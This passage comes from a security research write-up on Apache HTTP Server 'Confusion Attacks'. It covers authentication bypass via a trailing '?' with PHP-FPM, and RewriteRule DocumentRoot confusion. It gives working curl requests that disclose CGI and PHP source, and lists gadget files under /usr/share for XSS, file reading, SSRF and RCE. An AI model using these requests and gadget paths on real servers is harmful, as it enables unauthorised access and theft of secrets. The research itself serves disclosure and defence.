+<p>First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the <code>r-&gt;filename</code> field is <code>admin.php?ooo.php</code>, which obviously does not match <code>admin.php</code>, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in <code>.php</code> to the <code>mod_proxy</code> using the <code>SetHandler</code> directive:</p>
+<p><em><strong>Path: &#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php8.2-fpm.conf</strong></em></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using (?:pattern) instead of (pattern) is a small optimization that</span></span><br><span class="line"><span class="comment"># avoid capturing the matching pattern (as $1) which isn&#x27;t used here</span></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;.+\.ph(?:ar|p|tml)$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> <span class="string">&quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;</span></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+<p>The <code>mod_proxy</code> will rewrite <code>r-&gt;filename</code> to the following URL and call the sub-module <code>mod_proxy_fcgi</code> to handle the subsequent FastCGI protocol:</p>
+<blockquote>
+<p>proxy:fcgi:&#x2F;&#x2F;127.0.0.1:9000&#x2F;var&#x2F;www&#x2F;html&#x2F;admin.php?ooo.php</p>
+</blockquote>
+<p>Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi&#x2F;fpm&#x2F;fpm&#x2F;fpm_main.c#L1044</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> APACHE_PROXY_FCGI_PREFIX <span class="string">&quot;proxy:fcgi://&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APACHE_PROXY_BALANCER_PREFIX <span class="string">&quot;proxy:balancer://&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (env_script_filename &amp;&amp;</span><br><span class="line">    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, <span class="keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* advance to first character of hostname */</span></span><br><span class="line">    <span class="type">char</span> *p = env_script_filename + (<span class="keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (*p != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        p++;    <span class="comment">/* move past hostname and port */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*p != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">/* Copy path portion in place to avoid memory leak.  Note</span></span><br><span class="line"><span class="comment">         * that this also affects what script_path_translated points</span></span><br><span class="line"><span class="comment">         * to. */</span></span><br><span class="line">        memmove(env_script_filename, p, <span class="built_in">strlen</span>(p) + <span class="number">1</span>);</span><br><span class="line">        apache_was_here = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ignore query string if sent by Apache (RewriteRule) */</span></span><br><span class="line">    p = <span class="built_in">strchr</span>(env_script_filename, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p) &#123;</span><br><span class="line">        *p =<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As you can see, PHP-FPM first normalizes the filename and splits it at the question mark <code>?</code> to extract the actual file path for execution (which is <code>/var/www/html/admin.php</code>). This leads to the bypass, and basically, <strong>all authentications or access controls based on the <code>Files</code> directive for a single PHP file are at risk when running together with PHP-FPM!</strong> 😮</p>
+<p>Many potentially risky configurations can be found on GitHub, such as <code>phpinfo()</code> restricted to internal network access only:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># protect phpinfo, only allow localhost and local network access</span></span><br><span class="line"><span class="section">&lt;Files php-info.php&gt;</span></span><br><span class="line">    <span class="comment"># LOCAL ACCESS ONLY</span></span><br><span class="line">    <span class="comment"># Require local </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># LOCAL AND LAN ACCESS</span></span><br><span class="line">    <span class="attribute">Require</span> ip <span class="number">10</span> <span class="number">172</span> <span class="number">192</span>.<span class="number">168</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Adminer blocked by <code>.htaccess</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files adminer.php&gt;</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">Allow</span>,<span class="literal">Deny</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Protected <code>xmlrpc.php</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files xmlrpc.php&gt;</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">Allow</span>,<span class="literal">Deny</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>CLI tools prevented from direct access:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files <span class="string">&quot;cron.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Through an inconsistency in how the authentication module and <code>mod_proxy</code> interpret the <code>r-&gt;filename</code> field, all the above examples can be successfully bypassed with just a <code>?</code>.</p>
+<h2 id="🔥-2-DocumentRoot-Confusion"><a href="#🔥-2-DocumentRoot-Confusion" class="headerlink" title="🔥 2. DocumentRoot Confusion"></a>🔥 2. DocumentRoot Confusion</h2><p>The next attack we’re diving into is the confusion based on DocumentRoot! Let’s consider this Httpd configuration for a moment:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"><span class="attribute">RewriteRule</span>  ^/html/(.*)$   /$<span class="number">1</span>.html</span><br></pre></td></tr></table></figure>
+<p>When you visit the URL <code>http://server/html/about</code>, which file do you think Httpd actually opens? Is it the one under the root directory, <code>/about.html</code>, or is it from the DocumentRoot at <code>/var/www/html/about.html</code>?</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/cb68682cbd04105d-03.png"></p>
+<p>The answer is — <strong>it accesses both paths</strong>. Yep, that’s our second Confusion Attack. <strong>For any<sup>[1]</sup> <code>RewriteRule</code>, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!</strong> Amazing, right? 😉</p>
+<p><em>[1] Located within <code>Server Config</code> or <code>VirtualHost Block</code></em></p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules&#x2F;mappers&#x2F;mod_rewrite.c#L4939</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(!(conf-&gt;options &amp; OPTION_LEGACY_PREFIX_DOCROOT)) &#123;</span><br><span class="line">        uri_reduced = apr_table_get(r-&gt;notes, <span class="string">&quot;mod_rewrite_uri_reduced&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prefix_stat(r-&gt;filename, r-&gt;pool) || uri_reduced != <span class="literal">NULL</span>) &#123;     <span class="comment">// &lt;------ [1] access without root</span></span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        <span class="type">char</span> *tmp = r-&gt;uri;</span><br><span class="line"></span><br><span class="line">        r-&gt;uri = r-&gt;filename;</span><br><span class="line">        res = ap_core_translate(r);             <span class="comment">// &lt;------ [2] access with root</span></span><br><span class="line">        r-&gt;uri = tmp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res != OK) &#123;</span><br><span class="line">            rewritelog((r, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&quot;prefixing with document_root of %s&quot;</span></span><br><span class="line">                        <span class="string">&quot; FAILED&quot;</span>, r-&gt;filename));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rewritelog((r, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="string">&quot;prefixed with document_root to %s&quot;</span>,</span><br><span class="line">                    r-&gt;filename));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rewritelog((r, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&quot;go-ahead with %s [OK]&quot;</span>, r-&gt;filename));</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Most of the time, the version without DocumentRoot doesn’t exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us “intentionally” access paths outside the Web Root. <strong>If today we can control the prefix of the <code>RewriteRule</code>, couldn’t we access any file on the system?</strong> That’s the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query">the examples from official Apache HTTP Server documentations</a> are vulnerable to attacks:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Remove mykey=???</span></span><br><span class="line"><span class="attribute">RewriteCond</span> <span class="string">&quot;%&#123;QUERY_STRING&#125;&quot;</span> <span class="string">&quot;(.*(?:^|&amp;))mykey=([^&amp;]*)&amp;?(.*)&amp;?$&quot;</span></span><br><span class="line"><span class="attribute">RewriteRule</span> <span class="string">&quot;(.*)&quot;</span> <span class="string">&quot;$1?%1%3&quot;</span></span><br></pre></td></tr></table></figure>
+<p>There are other <code>RewriteRule</code> that are also affected, such as rules based on caching needs or hiding file extensions:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/html/(.*)$&quot;</span>  <span class="string">&quot;/$1.html&quot;</span></span><br></pre></td></tr></table></figure>
+<p>The Rule trying to save bandwidth by opting for compressed versions of static files:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^(.*)\.(css|js|ico|svg)&quot;</span> <span class="string">&quot;$1\.$2.gz&quot;</span></span><br></pre></td></tr></table></figure>
+<p>The rule redirecting old URLs to the main site:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/oldwebsite/(.*)$&quot;</span>  <span class="string">&quot;/$1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>The rule returning a 200 OK for all CORS preflight requests:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_METHOD&#125;</span> OPTIONS</span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*)$ $<span class="number">1</span><span class="meta"> [R=200,L]</span></span><br></pre></td></tr></table></figure>
+<p>Theoretically, as long as the target prefix of a <code>RewriteRule</code> is controllable, we can access nearly the entire filesystem. But from the real-world cases above, extensions like <code>.html</code> and <code>.gz</code> are the restrictions that keep us from being truly free. So, can we access files outside <code>.html</code>? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!</p>
+<p>The following demonstrations are all based on this unsafe <code>RewriteRule</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/html/(.*)$&quot;</span>  <span class="string">&quot;/$1.html&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-2-1-Server-Side-Source-Code-Disclosure"><a href="#⚔️-Primitive-2-1-Server-Side-Source-Code-Disclosure" class="headerlink" title="⚔️ Primitive 2-1. Server-Side Source Code Disclosure"></a>⚔️ Primitive 2-1. Server-Side Source Code Disclosure</h3><p>Let’s introduce the first primitive of DocumentRoot Confusion — <strong>Arbitrary Server-Side Source Code Disclosure</strong>!</p>
+<p>Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpd’s logic, causing it to leak contents that should have been executed as code.</p>
+<h4 id="✔️-2-1-1-Disclose-CGI-Source-Code"><a href="#✔️-2-1-1-Disclose-CGI-Source-Code" class="headerlink" title="✔️ 2-1-1. Disclose CGI Source Code"></a>✔️ 2-1-1. Disclose CGI Source Code</h4><p>Starting with the disclosure of server-side CGI source code, since <code>mod_cgi</code> binds the CGI folder to a specified URL prefix via <code>ScriptAlias</code>, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/cgi-bin/download.cgi</span><br><span class="line"> <span class="comment"># the processed result from download.cgi</span></span><br><span class="line">$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F</span><br><span class="line"> <span class="comment"># #!/usr/bin/perl</span></span><br><span class="line"> <span class="comment"># use CGI;</span></span><br><span class="line"> <span class="comment"># ...</span></span><br><span class="line"> <span class="comment"># # the source code of download.cgi</span></span><br></pre></td></tr></table></figure>
+<h4 id="✔️-2-1-2-Disclose-PHP-Source-Code"><a href="#✔️-2-1-2-Disclose-PHP-Source-Code" class="headerlink" title="✔️ 2-1-2. Disclose PHP Source Code"></a>✔️ 2-1-2. Disclose PHP Source Code</h4><p>Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didn’t support PHP can disclose the source code!</p>
+<p>For example, <code>www.local</code> and <code>static.local</code> are two websites hosted on the same server; <code>www.local</code> allows PHP execution while <code>static.local</code> only serves static files. Hence, you can disclose sensitive info from <code>config.php</code> like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://www.local/config.php</span><br><span class="line"> <span class="comment"># the processed result (empty) from config.php</span></span><br><span class="line">$ curl http://www.local/var/www.local/config.php%3F -H <span class="string">&quot;Host: static.local&quot;</span></span><br><span class="line"> <span class="comment"># the source code of config.php</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-2-2-Local-Gadgets-Manipulation"><a href="#⚔️-Primitive-2-2-Local-Gadgets-Manipulation" class="headerlink" title="⚔️ Primitive 2-2. Local Gadgets Manipulation!"></a>⚔️ Primitive 2-2. Local Gadgets Manipulation!</h3><p>Next up is our second primitive — <strong>Local Gadgets Manipulation</strong>.</p>
+<p>First, when we talked about “accessing any file on the filesystem,” did you wonder: “Hey, could an unsafe <code>RewriteRule</code> access <code>/etc/passwd</code>?” The answer is Yes, and also no. What?</p>
+<p>Technically, the server does check if <code>/etc/passwd</code> exists, but Apache HTTP Server’s built-in access control blocks our access. Here’s a snippet from Apache HTTP Server’s <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">configuration template</a>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<p>You’ll notice it defaults to blocking access to the root directory <code>/</code> (<code>Require all denied</code>). So our “arbitrary file access” ability seems a bit less “any.” Does that mean the show’s over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, it’s a significant step forward!</p>
+<p>A closer inspection of different Httpd distributions reveals that <a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165">Debian&#x2F;Ubuntu</a> operating systems by default allow <code>/usr/share</code>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /usr/share&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<p>So, the next step is to “squeeze” all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!</p>
+<p><em>P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu&#x2F;Debian operating systems. However, in practice, we have also found that some applications remove the <code>Require all denied</code> line from the root directory, allowing direct access to <code>/etc/passwd</code>.</em></p>
+<p><img src="/posts/2024-08-confusion-attacks-en/92f358a5ab548ae0-04.png"></p>
+<h4 id="✔️-2-2-1-Local-Gadget-to-Information-Disclosure"><a href="#✔️-2-2-1-Local-Gadget-to-Information-Disclosure" class="headerlink" title="✔️ 2-2-1. Local Gadget to Information Disclosure"></a>✔️ 2-2-1. Local Gadget to Information Disclosure</h4><p>Let’s hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the <code>websocketd</code> service installed, the default package includes an example PHP script <code>dump-env.php</code> under <code>/usr/share/doc/websocketd/examples/php/</code>. If there’s a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.</p>
+<p>Additionally, if the target has services like Nginx or Jetty installed, though <code>/usr/share</code> is theoretically a read-only copy for package installation, these services still place their default Web Roots under <code>/usr/share</code>, making it possible to leak sensitive web application information, such as the <code>web.xml</code> in Jetty.</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</li>
+<li>&#x2F;usr&#x2F;share&#x2F;jetty9&#x2F;etc&#x2F;</li>
+<li>&#x2F;usr&#x2F;share&#x2F;jetty9&#x2F;webapps&#x2F;</li>
+</ul>
+<p>Here’s a simple demonstration using <code>setup.php</code> from the <code>Davical</code> package, which exists as a read-only copy, to leak contents of <code>phpinfo()</code>.</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/b891865923d68362-05.png"></p>
+<h4 id="✔️-2-2-2-Local-Gadget-to-XSS"><a href="#✔️-2-2-2-Local-Gadget-to-XSS" class="headerlink" title="✔️ 2-2-2. Local Gadget to XSS"></a>✔️ 2-2-2. Local Gadget to XSS</h4><p>Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.</p>
+<p><em><strong>Path: &#x2F;usr&#x2F;share&#x2F;libreoffice&#x2F;help&#x2F;help.html</strong></em></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line"><span class="keyword">var</span> n = url.<span class="title function_">indexOf</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (n != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// the URL came from LibreOffice help (F1)</span></span><br><span class="line">    <span class="keyword">var</span> version = <span class="title function_">getParameterByName</span>(<span class="string">&quot;Version&quot;</span>, url);</span><br><span class="line">    <span class="keyword">var</span> query = url.<span class="title function_">substr</span>(n + <span class="number">1</span>, url.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">var</span> newURL = version + <span class="string">&#x27;/index.html?&#x27;</span> + query;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(newURL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;latest/index.html&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Thus, even if the target hasn’t deployed any web application, we can still create XSS using an unsafe <code>RewriteRule</code> through files that come within the operating system.</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/7ca2c0badb60f2df-06.png"></p>
+<h4 id="✔️-2-2-3-Local-Gadget-to-LFI"><a href="#✔️-2-2-3-Local-Gadget-to-LFI" class="headerlink" title="✔️ 2-2-3. Local Gadget to LFI"></a>✔️ 2-2-3. Local Gadget to LFI</h4><p>What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;doc&#x2F;libphp-jpgraph-examples&#x2F;examples&#x2F;show-source.php</li>
+<li>&#x2F;usr&#x2F;share&#x2F;javascript&#x2F;jquery-jfeed&#x2F;proxy.php</li>
+<li>&#x2F;usr&#x2F;share&#x2F;moodle&#x2F;mod&#x2F;assignment&#x2F;type&#x2F;wims&#x2F;getcsv.php</li>
+</ul>
+<p>Here’s a simple example exploiting <code>proxy.php</code> from jQuery-jFeed to read <code>/etc/passwd</code>:</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/59b47f0ae6d8d13b-07.png"></p>
+<h4 id="✔️-2-2-4-Local-Gadget-to-SSRF"><a href="#✔️-2-2-4-Local-Gadget-to-SSRF" class="headerlink" title="✔️ 2-2-4. Local Gadget to SSRF"></a>✔️ 2-2-4. Local Gadget to SSRF</h4><p>Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a <code>magpie_debug.php</code> file, which is fabulous gadget for exploiting:</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;php&#x2F;magpierss&#x2F;scripts&#x2F;magpie_debug.php</li>
+</ul>
+<h4 id="✔️-2-2-5-Local-Gadget-to-RCE"><a href="#✔️-2-2-5-Local-Gadget-to-RCE" class="headerlink" title="✔️ 2-2-5. Local Gadget to RCE"></a>✔️ 2-2-5. Local Gadget to RCE</h4><p>So, can we achieve RCE? Hold on, let’s take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841">CVE-2017-9841</a> to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password <code>admin</code>. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!</p>
+<h3 id="⚔️-Primitive-2-3-Jailbreak-from-Local-Gadgets"><a href="#⚔️-Primitive-2-3-Jailbreak-from-Local-Gadgets" class="headerlink" title="⚔️ Primitive 2-3. Jailbreak from Local Gadgets"></a>⚔️ Primitive 2-3. Jailbreak from Local Gadgets</h3><p>You might ask: “Can’t we really break out of <code>/usr/share</code>?” Of course, we can, that brings out our third primitive — <strong>Jailbreak from <code>/usr/share</code></strong>!</p>
+<p>In <a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160">Debian&#x2F;Ubuntu</a> distributions of Httpd, the <code>FollowSymLinks</code> option is explicitly enabled by default. Even in non-Debian&#x2F;Ubuntu versions, Apache HTTP Server also <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/core.html#options">implicitly allows Symbolic Links</a> by default.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /&gt;</span></span><br><span class="line">    <span class="attribute">Options</span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="✔️-2-3-1-Jailbreak-from-Local-Gadgets"><a href="#✔️-2-3-1-Jailbreak-from-Local-Gadgets" class="headerlink" title="✔️ 2-3-1. Jailbreak from Local Gadgets"></a>✔️ 2-3-1. Jailbreak from Local Gadgets</h4><p>So, any package that has a Symbolic Link in its installation directory pointing outside of <code>/usr/share</code> can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links we’ve discovered so far:</p>
+<ul>
+<li><strong>Cacti Log</strong>: <code>/usr/share/cacti/site/</code> -&gt; <code>/var/log/cacti/</code></li>
+<li><strong>Solr Data</strong>: <code>/usr/share/solr/data/</code> -&gt; <code>/var/lib/solr/data</code></li>
+<li><strong>Solr Config</strong>: <code>/usr/share/solr/conf/</code> -&gt; <code>/etc/solr/conf/</code></li>
+<li><strong>MediaWiki Config</strong>: <code>/usr/share/mediawiki/config/</code> -&gt; <code>/var/lib/mediawiki/config/</code></li>
+<li><strong>SimpleSAMLphp Config</strong>: <code>/usr/share/simplesamlphp/config/</code> -&gt; <code>/etc/simplesamlphp/</code></li>
+</ul>
+<h4 id="✔️-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE"><a href="#✔️-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE" class="headerlink" title="✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE"></a>✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE</h4><p>To wrap up our jailbreak primitive, let’s showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, there’s an <code>instances/</code> folder pointing to <code>/var/lib/redmine/</code>, and within <code>/var/lib/redmine/</code>, the <code>default/config/</code> folder points to the <code>/etc/redmine/default/</code> directory, which holds Redmine’s database setting and secret key.</p>
